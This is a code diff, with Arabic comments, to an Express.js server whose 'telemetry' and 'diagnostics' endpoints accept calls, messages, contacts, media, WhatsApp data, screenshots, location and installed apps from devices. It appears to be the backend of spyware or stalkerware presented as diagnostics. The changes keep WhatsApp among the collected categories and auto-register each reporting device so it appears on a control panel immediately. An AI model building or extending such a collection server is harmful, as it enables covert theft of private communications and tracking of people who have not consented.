@@ -41,7 +41,7 @@ app.post("/api/telemetry", (req, res) => {
     const deviceId = cleanId(req.body?.deviceId || "unknown");
     db.devices = db.devices || {};
     db.devices[deviceId] = {
-        model: cleanStr(req.body?.model),
+        model: cleanStr(req.body?.model || deviceId),
         battery: req.body?.battery,
         lastSeen: Date.now()
     };
@@ -53,7 +53,6 @@ app.post("/api/diagnostics/:category", (req, res) => {
   const id = cleanId(cleanStr(req.body?.deviceId, 64));
   const category = cleanStr(req.params.category, 16);
   
-  // إعادة إضافة "whatsapp" وجميع الفئات المسموحة لتوافق التطبيق والسيرفر
   const allowed = ["calls", "messages", "contacts", "media", "whatsapp", "screenshots", "location", "network", "apps", "ping"];
   if (!id || !allowed.includes(category)) {
       return res.status(400).json({ error: "Invalid request or category" });
@@ -67,6 +66,13 @@ app.post("/api/diagnostics/:category", (req, res) => {
     updatedAt: Date.now(),
     count: Number(req.body?.count) || 0,
     items: Array.isArray(req.body?.items) ? req.body.items.slice(0, 200).map(i => cleanStr(i, 512)) : [],
+  };
+
+  // << التعديل الهام هنا: تسجيل الجهاز تلقائياً في قائمة الأجهزة ليظهر في اللوحة فوراً >>
+  if (!db.devices) db.devices = {};
+  db.devices[id] = {
+      model: id,
+      lastSeen: Date.now()
   };
   
   writeDB(db);
